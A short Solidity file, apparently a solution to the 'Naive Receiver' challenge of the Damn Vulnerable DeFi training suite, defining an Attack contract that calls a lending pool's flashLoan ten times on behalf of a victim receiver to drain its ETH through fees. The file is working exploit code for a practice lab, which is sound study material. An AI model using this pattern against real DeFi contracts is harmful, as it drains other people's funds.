// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attack {

    NaiveReceiverLenderPool private pool;
    FlashLoanReceiver private receiver;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(NaiveReceiverLenderPool _pool, FlashLoanReceiver _receiver) {
        pool = _pool;
        receiver = _receiver;
    }

    function attack() external {
        for (uint i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 0, "0x");
        }
    }
    
}
